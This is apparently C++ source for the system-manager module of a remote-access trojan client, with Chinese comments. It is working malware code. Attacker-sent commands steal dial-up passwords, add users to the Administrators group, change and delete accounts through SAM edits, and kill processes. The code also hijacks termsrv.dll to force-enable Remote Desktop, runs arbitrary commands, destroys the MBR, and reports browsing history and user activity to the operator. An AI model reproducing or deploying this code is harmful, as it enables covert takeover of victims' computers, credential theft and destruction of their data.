// SystemManager.cpp: implementation of the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////
#include "SystemManager.h"
#include <stdlib.h>
#include <tlhelp32.h>

#include <psapi.h>
#pragma comment(lib,"Psapi.lib")
#include <Wtsapi32.h>
#pragma comment(lib,"Wtsapi32.lib")
#include <LM.h>
#pragma comment(lib,"netapi32")
#include "Dialupass.h"


#include "GetNetState.h"
extern HMODULE hDllModule;

DWORD m_dwStartMiSeconds;
DWORD m_dwStartMiSeconds1;
BOOL bFirst = TRUE;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CSystemManager::CSystemManager(CClientSocket *pClient,LPCSTR lpszHost, UINT nPort) : CManager(pClient)
{
	SendProcessList();
	hSendMemoryThread= MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendCPUAndMemoryThread, (LPVOID)this, 0, NULL);
	NetPort = nPort;        //连接端口
	Linkaddress = lpszHost; //连接地址
	bFirst = TRUE;
}

CSystemManager::~CSystemManager()
{
	WaitForSingleObject(hSendMemoryThread, INFINITE);
	CloseHandle(hSendMemoryThread);
}

bool SwitchInputDesktop()
{
	
	BOOL	bRet = false;
	DWORD	dwLengthNeeded;
	
	HDESK	hOldDesktop, hNewDesktop;
	char	strCurrentDesktop[256], strInputDesktop[256];
	hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	memset(strCurrentDesktop, 0, sizeof(strCurrentDesktop));
	GetUserObjectInformation(hOldDesktop, UOI_NAME, &strCurrentDesktop, sizeof(strCurrentDesktop), &dwLengthNeeded);
	
	
	hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	memset(strInputDesktop, 0, sizeof(strInputDesktop));
	GetUserObjectInformation(hNewDesktop, UOI_NAME, &strInputDesktop, sizeof(strInputDesktop), &dwLengthNeeded);
	
	if (lstrcmpi(strInputDesktop, strCurrentDesktop) != 0)
	{
		SetThreadDesktop(hNewDesktop);
		bRet = true;
	}
	CloseDesktop(hOldDesktop);
	
	CloseDesktop(hNewDesktop);
	
	
	return bRet;
}

void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	SwitchInputDesktop();

	switch (lpBuffer[0])
	{
	case COMMAND_PSLIST:
		SendProcessList();
		break;
	case COMMAND_WSLIST:
		SendWindowsList();
		break;
	case COMMAND_KILLPROCESS:
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
//		SendProcessList();
		break;
	case COMMAND_DSLIST:   //获取拨号密码
		SendDialupassList();
		break;
	case COMMAND_SOFTWARELIST:
		SendSoftWareList();
		break;
	case COMMAND_KILLPROCESS_WINDOW:
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
//		SendWindowsList();	
		break;
	case COMMAND_PROCESSFREEZING: //进程冻结
		ProcessFreezing((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_PROCESSTHAWING: //进程解冻
		ProcessThawing((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_WINDOW_TEST:
		TestWindow(lpBuffer+1);   
		break;
	case COMMAND_WINDOW_CLOSE:  //向窗口发送关闭消息
		CloseWindow(lpBuffer+1);  
		break;
	case COMMAND_SSLIST:
		SendSysInfoList();
		break;
	case COMMAND_USLIST:
		SendSysUserList();
		break;
	case COMMAND_ASLIST:
		SendUserStateList();
		break;
	case COMMAND_ACITVEUSER:
		ChangeUserState((LPBYTE)lpBuffer + 1, nSize - 1, NULL);  
		break;
	case COMMAND_DISABLEEUSER:
		ChangeUserState((LPBYTE)lpBuffer + 1, nSize - 1, TRUE);  
		break;
	case COMMAND_CHANGE_USERPASS:
		ChangeUserPass((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_DELUSER:
		DeleteUser((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_DISCONNECTUSER:
		DisconnectUser((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_LOGOFF_USER:
		LogOffUser((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_NET_USER: // 无NET加用户
		NoNetAddUser((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_3389_PORT:
		Change3389Port(lpBuffer + 1);
		break;
	case COMMAND_OPEN_3389:
		Open3389();
		break;
	case COMMAND_SEND_TERMSRV:
		if(WriteTermsrv(lpBuffer + 1,nSize -1))
		{
			BYTE bToken = TOKEN_TERMSRV_OK;
			Send(&bToken,sizeof(bToken));
		}
		break;
	case COMMAND_S_SESSION:
		ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_IHLIST:
		SendIEHistoryList();//IE历史浏览记录
		break;
	case COMMAND_FULIST:
		SendFavoritesUrlList();//IE收藏夹
		break;
	case COMMAND_NSLIST:
		SendNetStateList();//网络连接列表
		break;
	case COMMAND_HOSTS:
		SendHostsList();
		break;
	case COMMAND_NETWORK:
		SendNetWorkList();
		break;
	case COMMAND_RUN:
		SendRunList();
		break;
	case COMMAND_APPUNINSTALL:
		WinExec((LPCSTR)lpBuffer + 1,SW_SHOW);// 卸载程序
		break;
	case COMMAND_KILLMBR://硬盘毁灭
		KillMBR();
		break;
	case COMMAND_FILEATTR:
		SendFileAttr((LPCSTR)lpBuffer + 1); //文件属性
		break;
	default:
		break;
	}
}

BOOL bIsOsXP()
{
	OSVERSIONINFOEX OsVerInfoEx;
	OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // 注意转换类型
	return OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 1;
}

void CSystemManager::GetTermsrvFile()
{
	BYTE bToken = TOKEN_GET_TERMSRV;
	Send(&bToken,sizeof(bToken));
}

BOOL CSystemManager::WriteTermsrv(LPBYTE lpBuffer, UINT nSize)
{
	TCHAR		lpDllName[MAX_PATH];
	GetSystemDirectory(lpDllName, MAX_PATH);
	lstrcat(lpDllName, "\\termsrv_t.dll");
	
	HANDLE hFile; 
	DWORD  dwBytesWritten;
	hFile = CreateFile(lpDllName,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,NULL,NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return false;
    if(!WriteFile(hFile, lpBuffer, nSize, &dwBytesWritten, NULL)) 
		return false;
	CloseHandle(hFile); 

	Open3389();
	
	return true;
}


bool UnloadRemoteModule(DWORD dwProcessID, HANDLE hModuleHandle)
{
	HANDLE hRemoteThread;
	HANDLE hProcess;
	
	if (hModuleHandle == NULL)
		return false;
	hProcess=OpenProcess(PROCESS_VM_WRITE|PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION, FALSE, dwProcessID);
	if (hProcess == NULL)
		return false;
	
	char ExUmf[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
	
	char TjHbd[] = {'F','r','e','e','L','i','b','r','a','r','y','\0'};
	
	HMODULE hModule=GetModuleHandle(ExUmf);
	LPTHREAD_START_ROUTINE pfnStartRoutine = (LPTHREAD_START_ROUTINE)::GetProcAddress(hModule, TjHbd);
	hRemoteThread=CreateRemoteThread(hProcess, NULL, 0, pfnStartRoutine, hModuleHandle, 0, NULL);
	
	if(hRemoteThread==NULL)
	{
		CloseHandle(hProcess);
		return false;
	}
	WaitForSingleObject(hRemoteThread,INFINITE);
	CloseHandle(hProcess);
	CloseHandle(hRemoteThread);
	return true;
}

HANDLE FindModule(DWORD dwProcessID, LPCTSTR lpModulePath)
{
	HANDLE hModuleHandle = NULL;
	MODULEENTRY32 me32 = {0};
	HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessID);
	me32.dwSize = sizeof(MODULEENTRY32);
	if(::Module32First(hModuleSnap, &me32))
	{
		do
		{	
			if (lstrcmpi(me32.szExePath, lpModulePath) == 0)
			{
				hModuleHandle = me32.hModule;
				break;
			}
		}while(::Module32Next(hModuleSnap,&me32));
	}
	::CloseHandle(hModuleSnap);
	return hModuleHandle;
}


bool UnloadModule(LPCTSTR lpModulePath)
{
	BOOL bRet = false;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);
	
	HANDLE hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	
	//查找相关的进程
	if(Process32First(hProcessSnap, &pe32))
	{
		do
		{
			HANDLE hModuleHandle = FindModule(pe32.th32ProcessID, lpModulePath);
			if (hModuleHandle != NULL)
			{
				bRet = UnloadRemoteModule(pe32.th32ProcessID, hModuleHandle);
			}
		}while (Process32Next(hProcessSnap,&pe32));
	}
	CloseHandle(hProcessSnap);
	return bRet;
}

bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	if (!IsWindowVisible(hwnd))
		return true;
	
	DWORD dwWindowThreadId = NULL;
	DWORD dwLsassId = (DWORD)lParam;
	GetWindowThreadProcessId(hwnd, &dwWindowThreadId);
	if (dwWindowThreadId == (DWORD)lParam)
	{
		// 关闭指定进程的窗口
		SendMessage(hwnd, WM_CLOSE, 0, 0);
	}
	return true;
}
DWORD GetProcessId(LPCTSTR szProcName)
{
	PROCESSENTRY32 pe; 
	DWORD dwPid;
	DWORD dwRet;
	BOOL bFound = FALSE;
	
	HANDLE hSP = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSP)
	{
		pe.dwSize = sizeof( pe );
		
		for (dwRet = Process32First(hSP, &pe); dwRet; dwRet = Process32Next(hSP, &pe))
		{
			if (lstrcmpi( szProcName, pe.szExeFile) == 0)
			{
				dwPid = pe.th32ProcessID;
				bFound = TRUE;
				break;
			}
		}
		CloseHandle(hSP);
		
		if (bFound == TRUE)
		{
			return dwPid;
		}
	}
	return NULL;
}

void HijackService()
{
	TCHAR strDll[MAX_PATH];
	GetSystemDirectory(strDll, sizeof(strDll));
	lstrcat(strDll, "\\termsrv.dll");
	
	// 遍历进程卸载现在加载的DLL
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, TRUE);
	if (!UnloadModule(strDll))
		return;
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, FALSE);
	
	// 关闭要弹出的出错对话框和因DLL强制卸载使一些服务异常终止而弹出来的自动关机对话框
	// 对进程赋予关闭权限
	CSystemManager::DebugPrivilege(SE_SHUTDOWN_NAME,TRUE);
	DWORD dwLsassId = GetProcessId("csrss.exe");
	while (!AbortSystemShutdown(NULL))
	{
		// 一些系统是会弹出drwtsn32.exe
		DWORD dwDrwtsn32Id = GetProcessId("drwtsn32.exe");
		if (dwDrwtsn32Id != NULL)
		{
			EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)dwDrwtsn32Id);
		}
		// 模块强制卸载时会出错，关闭csrss.exe进程弹出的出错窗口
		EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)dwLsassId);
		Sleep(10);
	}
	CSystemManager::DebugPrivilege(SE_SHUTDOWN_NAME, FALSE);
}

void OnStartService(LPCTSTR lpService)
{
	SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
	if ( NULL != hSCManager )
	{
		SC_HANDLE hService = OpenService(hSCManager, lpService, DELETE | SERVICE_START);
		if ( NULL != hService )
		{
			StartService(hService, 0, NULL);
			CloseServiceHandle( hService );
		}
		CloseServiceHandle( hSCManager );
	}
}

void CSystemManager::Open3389()
{
	if (bIsOsXP())
	{
		TCHAR szDllPath[MAX_PATH];
		GetSystemDirectory(szDllPath, sizeof(szDllPath));
		lstrcat(szDllPath, "\\termsrv_t.dll");
		
		if (GetFileAttributes(szDllPath) != -1)
		{
			HMODULE hLoad = LoadLibrary(szDllPath);
			if (hLoad)
				FreeLibrary(hLoad);
			else
			{
				GetTermsrvFile();
				return;
			}
		}
		else
		{
			GetTermsrvFile();
			return; 
		}
	}
	
	WriteRegEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "ShutdownWithoutLogon", REG_DWORD, NULL, 0, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", "EnableAdminTSRemote", REG_DWORD, NULL, 1, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "KeepRASConnections", REG_SZ, "1", 0, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\TermDD", "Start", REG_DWORD, NULL, 2, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\TermService", "iKNVW", REG_DWORD, NULL, 2, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "TSEnabled", REG_DWORD, NULL, 1, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core", "EnableConcurrentSessions", REG_DWORD, NULL, 1, 0);
	
	if (bIsOsXP())
	{
		
		WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters", "ServiceDll", REG_EXPAND_SZ,
			"%SystemRoot%\\system32\\termsrv_t.dll", 0, 0);
		HijackService();
	}
	OnStartService("TermService");
	Sleep(500);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "fDenyTSConnections", REG_DWORD, NULL, 0, 0);
}

BOOL CSystemManager::Change3389Port(LPVOID lparam)
{
	DWORD szPort=atoi((char*)lparam);
	if (szPort>65535 || szPort <= 0)
		return FALSE;
	
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\RDPTcp", "PortNumber", REG_DWORD, NULL, szPort, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", "PortNumber", REG_DWORD, NULL, szPort, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\tcp", "PortNumber", REG_DWORD, NULL, szPort, 0);
	
	return TRUE;
}

wchar_t* AnsiToUnicode(char* str)
{
	if( !str )
		return NULL;
	
	int wcslen = ::MultiByteToWideChar(CP_ACP, NULL, str, strlen(str), NULL, 0);
	wchar_t *wstr = new wchar_t[wcslen + 1];
	::MultiByteToWideChar(CP_ACP, NULL, str, strlen(str), wstr, wcslen);
	wstr[wcslen] = '\0';
	
	return wstr;
}

void CSystemManager::DisconnectUser(LPBYTE lpBuffer, UINT nSize)
{
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, TRUE);
	
	for (int i = 0; i < nSize; i += 4)
	{
		WTSDisconnectSession(WTS_CURRENT_SERVER_HANDLE, *(LPDWORD)(lpBuffer + i) , FALSE );
	}
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, FALSE);
	
	SendUserStateList();
}

void CSystemManager::LogOffUser(LPBYTE lpBuffer, UINT nSize)
{
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, TRUE);
	
	for (int i = 0; i < nSize; i += 4)
	{
		WTSLogoffSession(WTS_CURRENT_SERVER_HANDLE, *(LPDWORD)(lpBuffer + i) , FALSE );
	}
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, FALSE);
	
	SendUserStateList();
}

void CSystemManager::NoNetAddUser(LPBYTE lpBuffer, UINT nSize)
{
	USER_INFO_1 ui;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;
	
	TCHAR *lpUser = (TCHAR *)lpBuffer;
	TCHAR *lpPass = (TCHAR *)lpBuffer + ( (lstrlen(lpUser) + 1) * sizeof(TCHAR));
	TCHAR *lpGroup = (TCHAR *)lpBuffer + ( (lstrlen(lpPass) + 1) * sizeof(TCHAR) + (lstrlen(lpUser) + 1) * sizeof(TCHAR));
	
	ui.usri1_name = AnsiToUnicode(lpUser);    //这个是要添加的用户名，可以自己改改
	ui.usri1_password = AnsiToUnicode(lpPass);   //这个是用户密码，也可以自己改改
	ui.usri1_priv = USER_PRIV_USER; 
	ui.usri1_home_dir = NULL; 
	ui.usri1_comment = NULL; 
	ui.usri1_flags = UF_SCRIPT; 
	ui.usri1_script_path = NULL; 
	nStatus = NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
	
	if (nStatus != NERR_Success)
	{
		return;
	}
	wchar_t szAccountName[100]={0};  
	wcscpy(szAccountName,ui.usri1_name);  
	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname=szAccountName;  
	
	//添加到Administrators组
	nStatus = NetLocalGroupAddMembers(NULL,AnsiToUnicode(lpGroup),3,(LPBYTE)&account,1);
	if (nStatus == NERR_Success)
	{
		SendSysUserList();
	}
	return;
}

void CSystemManager::DeleteUser(LPBYTE lpBuffer, UINT nSize)
{
	TCHAR *lpUserName =  (TCHAR*)lpBuffer;
	BYTE bToken = NULL;
	NET_API_STATUS nStatus;	
	nStatus = NetUserDel(NULL,AnsiToUnicode(lpUserName));
	if(nStatus==NERR_Success)
	{
		goto DELSUCCESS;
	}
	if(nStatus!=NERR_Success&&nStatus!=NERR_UserNotFound)
	{
		char strType[32]={0};
		TCHAR lpSubKey[128];
		wsprintf(lpSubKey,"SAM\\SAM\\Domains\\Account\\Users\\Names\\%s",lpUserName);
		
		if(!ReadRegEx(HKEY_LOCAL_MACHINE,lpSubKey,"",REG_BINARY,strType,NULL, sizeof(DWORD),0))
			return;
		
		if(WriteRegEx(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\Names\\", lpUserName, NULL, NULL, NULL, 2))
		{
			
			if(!WriteRegEx(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\", strType, REG_SZ, NULL, NULL, 2))
				return;
			else
				goto DELSUCCESS;
		}
		else
			return;
	}
	
DELSUCCESS:
	SendSysUserList();
}

void CSystemManager::ChangeUserPass(LPBYTE lpBuffer, UINT nSize)
{
	BYTE bToken = NULL;
	TCHAR *lpUser =  (TCHAR*)lpBuffer;
	TCHAR *lpPass =  (TCHAR*)lpBuffer + ((lstrlen(lpUser) + 1) * sizeof(TCHAR));
	
	USER_INFO_3 *pUI=NULL;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;	
	
	nStatus=NetUserGetInfo(NULL,AnsiToUnicode(lpUser),3,(LPBYTE*)&pUI);
	
	pUI->usri3_flags = UF_NORMAL_ACCOUNT|UF_DONT_EXPIRE_PASSWD;
	pUI->usri3_password=AnsiToUnicode(lpPass);
	pUI->usri3_password_expired=FALSE;
	nStatus=NetUserSetInfo(NULL,AnsiToUnicode(lpUser),3,(LPBYTE)pUI,&dwError);
	
	if(nStatus==NERR_Success)
	{
		bToken = TOKEN_CHANGE_PSAA_SUCCESS;
		Send(&bToken, 1);
		LocalFree((LPBYTE)&bToken);
	}
	if (pUI != NULL)
		NetApiBufferFree(pUI);
}


void CSystemManager::ChangeUserState(LPBYTE lpBuffer, UINT nSize , UINT User_kt)  //帐户启用/停用
{
	wchar_t user_name[256]={0};
	USER_INFO_1008 ui;
	DWORD dwLevel = 1008;
	NET_API_STATUS nStatus;
	mbstowcs(user_name, (const char *)lpBuffer,256);
	if(User_kt==NULL)  //用户启用
		ui.usri1008_flags = UF_SCRIPT|UF_DONT_EXPIRE_PASSWD;  // 用户停用 | 密码用不过期
	else  //用户停用
		ui.usri1008_flags = UF_ACCOUNTDISABLE|UF_PASSWD_CANT_CHANGE;  // 用户停用 | 用户不能更改密码
	
	nStatus = NetUserSetInfo( NULL,user_name,dwLevel, (LPBYTE )&ui,NULL);
	if (nStatus == NERR_Success)
		SendSysUserList();
}

__int64 CompareFileTime ( FILETIME time1, FILETIME time2 )   
{   
	__int64 a = time1.dwHighDateTime << 32 | time1.dwLowDateTime ;   
	__int64 b = time2.dwHighDateTime << 32 | time2.dwLowDateTime ;   
	
	return   (b - a);   
}   
 
int GetCPUOcupPerc()   
{   
	HMODULE hModule_Kernel32 = LoadLibrary("kernel32.dll");
	typedef BOOL (WINAPI *TGetSystemTimes)(LPFILETIME,LPFILETIME,LPFILETIME); 
	TGetSystemTimes MyGetSystemTimes = (TGetSystemTimes) GetProcAddress(hModule_Kernel32, "GetSystemTimes");

    HANDLE hEvent;   
    BOOL res ;   
	
    FILETIME preidleTime;   
    FILETIME prekernelTime;   
    FILETIME preuserTime;   
	
    FILETIME idleTime;   
    FILETIME kernelTime;   
    FILETIME userTime;   
	
    res = MyGetSystemTimes( &idleTime, &kernelTime, &userTime );   
	
    preidleTime = idleTime;   
    prekernelTime = kernelTime;   
    preuserTime = userTime ;   
	
    Sleep(1000);
    res = MyGetSystemTimes( &idleTime, &kernelTime, &userTime );   
	
    int idle = CompareFileTime( preidleTime,idleTime);   
    int kernel = CompareFileTime( prekernelTime, kernelTime);   
    int user = CompareFileTime(preuserTime, userTime);   
	
    int cpu = (kernel +user - idle) *100/(kernel+user);   

	if (hModule_Kernel32)
		FreeLibrary(hModule_Kernel32);

    return cpu;   
}   

int GetMemOcpuPerc()   
{   
	MEMORYSTATUSEX statex;   
	
	statex.dwLength = sizeof (statex);   
	
	GlobalMemoryStatusEx (&statex);   
	
	return (int)statex.dwMemoryLoad;   
}
  
DWORD dwLastIn  = 0;   
DWORD dwLastOut = 0;   
DWORD dwBandIn  = 0;   
DWORD dwBandOut = 0;   
DWORD dwLastIn1[5]  = {0, 0};
DWORD dwLastOut1[5] = {0, 0};

bool GetBandOut(DWORD &dwBandoutBytes,DWORD &dwBandInputBytes)
{

	//获取网络适配器数量
	PMIB_IFTABLE pTable = NULL;   
	DWORD dwAdapters = 0;   
	ULONG uRetCode = GetIfTable(pTable, &dwAdapters, TRUE);   
	if (ERROR_NOT_SUPPORTED == uRetCode)   
	{
		return false;   
	}   
	else if (ERROR_INSUFFICIENT_BUFFER == uRetCode)   
	{   
		pTable = (PMIB_IFTABLE)new BYTE[dwAdapters];   
	}   
	
	//获取适配器数据
	DWORD dwRet = GetIfTable(pTable, &dwAdapters, TRUE);
	if (NO_ERROR != dwRet)
	{
		return false;
	}
	
	//解析适配器数据，获取流量信息
	DWORD dwInOctets = 0;   
	DWORD dwOutOctets = 0;   
	for (UINT i = 0; i < pTable->dwNumEntries; i++)   
	{//分别统计每个网卡数据   
		MIB_IFROW Row = pTable->table[i];   
		
		//获取下载数据
		DWORD dwBandIn1 = 0;
		if (dwLastIn1[i] <= 0)
			dwBandIn1 = 0;
		else
			dwBandIn1 = (Row.dwInOctets - dwLastIn1[i]);
		
		//获取上传数据
		DWORD dwBandOut1 = 0;
		if (dwLastOut1[i] <= 0)
			dwBandOut1 = 0;
		else
			dwBandOut1 = Row.dwOutOctets - dwLastOut1[i];
		
		dwLastIn1[i] = Row.dwInOctets;
		dwLastOut1[i] = Row.dwOutOctets;
		
		//统计总的数据
		dwInOctets += Row.dwInOctets;   
		dwOutOctets += Row.dwOutOctets;   
	}   
	
	dwBandIn = dwInOctets - dwLastIn;   
	dwBandOut = dwOutOctets - dwLastOut;   
	if (dwLastIn <= 0)   
	{   
		dwBandIn = 0;   
	}   
	else   
	{   
		dwBandIn = dwBandIn;   
	}   
	
	if (dwLastOut <= 0)   
	{   
		dwBandOut = 0;   
	}   
	else   
	{   
		dwBandOut = dwBandOut;   
	}   
	
	dwLastIn = dwInOctets;   
	dwLastOut = dwOutOctets;   
	
	dwBandoutBytes = dwBandOut; //上传

	dwBandInputBytes = dwBandIn; //下载
	if (bFirst)
	{
		bFirst = FALSE;
	}
	else
	{
		DWORD dwMiSeconds = GetTickCount() - m_dwStartMiSeconds;
		DWORD dwMiSeconds1 = GetTickCount() - m_dwStartMiSeconds1;
		
 		dwMiSeconds1 = dwMiSeconds1 < 0 ? 1000 : dwMiSeconds1;
 		dwBandInputBytes = dwBandInputBytes * 1000 / dwMiSeconds1;
		
		dwMiSeconds = dwMiSeconds < 0 ? 1000 : dwMiSeconds;
		dwBandoutBytes = dwBandoutBytes * 1000 / dwMiSeconds;		
	}

	m_dwStartMiSeconds1 = GetTickCount();
	m_dwStartMiSeconds = GetTickCount();
	delete  []pTable;   
	
	return true;
}

bool GetUerTime(int &dwTime)
{
	LASTINPUTINFO lpi;
	bool bIsActive;
	lpi.cbSize = sizeof(lpi);
	GetLastInputInfo(&lpi);
	dwTime = (GetTickCount() - lpi.dwTime)/1000;//得到秒数
//	wsprintf(dwTime, "%d 秒", iTime);
	
	//是否活动
	if ((::GetTickCount()-lpi.dwTime) > 1000 * 60 * 3)//5分钟	
		bIsActive = true;//当前系统已经空闲了1分钟
	else
		bIsActive = false;

	return bIsActive;

}

DWORD WINAPI CSystemManager::SendCPUAndMemoryThread(LPVOID lparam)
{
	CSystemManager *pThis = (CSystemManager *)lparam;
	
	tagSysstatus Sysstatus;
	BYTE buf[50];
//	LPBYTE			lpBuffer = (LPBYTE)LocalAlloc(LPTR, sizeof(tagSystemInfo)+1);
	while (pThis->m_pClient->IsRunning())
	{          
		Sleep(1000 * 3);
		
		ZeroMemory(buf,50);
		buf[0] = TOKEN_CPUMEMORY;
		
		Sysstatus.Mem = GetMemOcpuPerc();
		Sysstatus.cpu = GetCPUOcupPerc();

		GetBandOut(Sysstatus.Bandout,Sysstatus.Bandout_B); //获取上下行宽带

		Sysstatus.bIsActive = GetUerTime(Sysstatus.dwTime);//获取是否有人在操作电脑
		
		memcpy(buf+1,&Sysstatus,sizeof(Sysstatus));   //内存

//		memcpy(buf+1+sizeof(DWORD),(void*)&cpu,sizeof(DWORD));
		
//		memcpy(buf+1+sizeof(DWORD),(void*)&Bandout,sizeof(DWORD)); //带宽
		
		pThis->Send(buf,sizeof(buf));
	}
	
	return true;
}
/*
tagSysstatus Sysstatus;
DWORD WINAPI CSystemManager::SendCPUAndMemoryThread(LPVOID lparam)
{
	CSystemManager *pThis = (CSystemManager *)lparam;


	BYTE buf[20];
	while (pThis->m_pClient->IsRunning())
	{          
		Sleep(1000 * 3);

		ZeroMemory(buf,20);
		buf[0] = TOKEN_CPUMEMORY;
		
		int Mem = GetMemOcpuPerc();
		int cpu = GetCPUOcupPerc();
		DWORD Bandout = 0 , Bandout_s = 0 ;
		GetBandOut(Bandout,Bandout_s);

		memcpy(buf+1,&Mem,sizeof(DWORD));   //内存
		memcpy(buf+1+sizeof(DWORD),(void*)&cpu,sizeof(DWORD));

		memcpy(buf+1+sizeof(DWORD),(void*)&Bandout,sizeof(DWORD)); //带宽

     	pThis->Send((unsigned char *)buf,sizeof(buf));
	}
	
	return true;
}
*/
void CSystemManager::SendSoftWareList()
{
	LPBYTE	lpBuffer = getSoftWareList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

LPBYTE CSystemManager::getSoftWareList()
{
	const int  MAX_LEG = 256 * sizeof(TCHAR);

	LPBYTE 	lpBuffer = NULL;
	DWORD	dwOffset = 1;
	DWORD   dwLength = 0;
	TCHAR regBufferValue[MAX_LEG] = {0};
	TCHAR regDisplayName[MAX_LEG] = {0};
	TCHAR regPublisher[MAX_LEG] = {0};
	TCHAR regDisplayVersion[MAX_LEG] = {0};
	TCHAR regInstallDate[MAX_LEG] = {0};
	TCHAR regUninstallString[MAX_LEG] = {0};

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	if(lpBuffer == NULL)
		return NULL;

	lpBuffer[0] = TOKEN_SOFTWARE;

	int n  = 0;
	HKEY hKey;
	DWORD dwRegNum = MAX_LEG;
	TCHAR regBufferName[MAX_LEG] = {0};
	if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
		NULL, KEY_READ, &hKey) == ERROR_SUCCESS    ) 
	{
		if( RegQueryInfoKey(hKey, NULL, NULL, NULL, &dwRegNum, NULL, NULL, NULL, NULL, NULL, NULL, NULL)    ==    ERROR_SUCCESS )
		{

			for( int i = 0; i < (int)dwRegNum; i++ ) 
			{    
				DWORD dwRegSize = MAX_LEG;
				RegEnumKeyEx(hKey, i, regBufferName, &dwRegSize, NULL, NULL, NULL, NULL);
				DWORD dwType; 
				HKEY hSubKey;
				if(  RegOpenKeyEx(hKey, regBufferName, NULL, KEY_READ, &hSubKey) == ERROR_SUCCESS)
				{
					
					dwRegSize = MAX_LEG;
					memset(regDisplayName,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "DisplayName", 0, &dwType, (LPBYTE)regDisplayName, &dwRegSize);


					dwRegSize = MAX_LEG;
					memset(regBufferValue,0,MAX_LEG);
					// 取ParentKeyName键值,判断是否是补丁信息, 是补丁信息键值为"OperatingSystem"
					RegQueryValueEx(hSubKey, "ParentKeyName", 0, &dwType, (LPBYTE)regBufferValue, &dwRegSize);
					if( lstrlen(regDisplayName) == 0 || lstrcmp( regBufferValue,"OperatingSystem") == 0 ) //判断是否是补丁信息 
					{
						continue;
					}

					
					dwRegSize = MAX_LEG;
					memset(regPublisher,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "Publisher", 0, &dwType,(LPBYTE)regPublisher, &dwRegSize);

					
					dwRegSize = MAX_LEG;
					memset(regDisplayVersion,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "DisplayVersion", 0, &dwType, (LPBYTE)regDisplayVersion, &dwRegSize);

					
					dwRegSize = MAX_LEG;
					memset(regInstallDate,0,MAX_LEG);
					// 判断是否能在注册表中获取到安装时间, 否取子项创建时间
